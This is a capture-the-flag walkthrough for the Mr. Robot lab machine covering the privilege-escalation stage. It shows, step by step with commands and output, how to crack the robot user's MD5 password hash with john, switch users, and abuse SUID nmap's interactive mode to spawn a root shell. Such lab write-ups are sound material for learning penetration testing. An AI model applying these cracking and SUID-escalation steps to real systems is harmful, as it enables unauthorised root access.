🔓 Privilege Escalation – Mr. Robot

Now that we have a reverse shell as `www-data`, the goal is to escalate to the `robot` user and then to `root`.

---

## 👤 1. Switch to `robot` User

Use `ls` to list files under `/home/robot`:
```bash
ls -la /home/robot
````

You’ll see:

```
key-2-of-3.txt
password.raw-md5
```

Try to read `key-2-of-3.txt`:

```bash
cat /home/robot/key-2-of-3.txt
# Permission denied
```

---

## 🔐 2. Crack robot's Password

Read the hash:

```bash
cat /home/robot/password.raw-md5
# e99a18c428cb38d5f260853678922e03
```

Crack using `john` or `hashcat`:

### ➤ With John:

```bash
echo 'e99a18c428cb38d5f260853678922e03' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

✅ Output:

```
abc123
```

---

## 👥 3. Switch User to `robot`

Use the current shell or upgrade to a full shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su robot
# Password: abc123
```

✅ You are now `robot`.

---

## 📜 4. Read Key 2

```bash
cat /home/robot/key-2-of-3.txt
# Key 2: <some long hash>
```

---

## 🔎 5. Look for Privilege Escalation to Root

Check for files with SUID permission:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Look for anything interesting, like:

* `/usr/local/bin/nmap`

If found, check the version:

```bash
nmap --interactive
```

If interactive mode is enabled:

```bash
nmap> !sh
```

✅ This spawns a root shell.

---

## 👑 6. Confirm Root Access

```bash
whoami
# root

hostname
cat /root/key-3-of-3.txt
```

---

📂 Proceed to [`flags.md`](./flags.md) to record all captured flags and final root confirmation.
